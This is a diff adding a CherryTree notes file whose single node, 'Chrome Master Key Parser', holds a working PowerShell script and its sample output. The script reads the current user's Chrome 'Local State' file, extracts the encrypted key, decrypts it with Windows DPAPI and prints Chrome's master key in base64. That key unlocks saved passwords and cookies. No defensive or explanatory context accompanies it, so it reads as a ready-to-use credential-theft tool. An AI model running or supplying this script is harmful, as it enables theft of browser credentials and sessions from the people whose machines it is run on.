@@ -1,0 +1,42 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="3" master_id="0" name="Chrome Master Key Parser" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="120" is_bold="0" foreground="" ts_creation="1761522633" ts_lastsave="1761524020">
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+Output:
+</rich_text>
+    <table char_offset="0" justification="left" col_min="300" col_max="300" col_widths="0,0">
+      <row>
+        <cell>OS</cell>
+        <cell>Windows </cell>
+      </row>
+      <row>
+        <cell>Language</cell>
+        <cell>PowerShell (.ps1)</cell>
+      </row>
+      <row>
+        <cell>Header</cell>
+        <cell>Information</cell>
+      </row>
+    </table>
+    <codebox char_offset="3" justification="left" frame_width="1200" frame_height="100" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">Add-Type -AssemblyName "System.Security"
+
+$LocalStateContent = Get-Content -Path "$($env:LOCALAPPDATA)\\Google\\Chrome\\User Data\\Local State" -Raw
+$match = [regex]::Match($LocalStateContent, '"encrypted_key"\s*:\s*"([^"]+)"')
+
+if ($match.Success) {
+    $encKeyBase64 = $match.Groups[1].Value
+    $encKeyBytes = [System.Convert]::FromBase64String($encKeyBase64)[5..([System.Convert]::FromBase64String($encKeyBase64).Length-1)]
+    $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKeyBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+    Write-Host "Master key (BASE64): $([System.Convert]::ToBase64String($masterKey))"
+} else {
+    Write-Host "Error: Could not find 'encrypted_key' in Local State file."
+}</codebox>
+    <codebox char_offset="14" justification="left" frame_width="1200" frame_height="1" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Master key (BASE64): VFG56fU7B4xdv7lP4sWNCRfNS4hmv/UiJFS+IauW4+0=</codebox>
+  </node>
+</cherrytree>
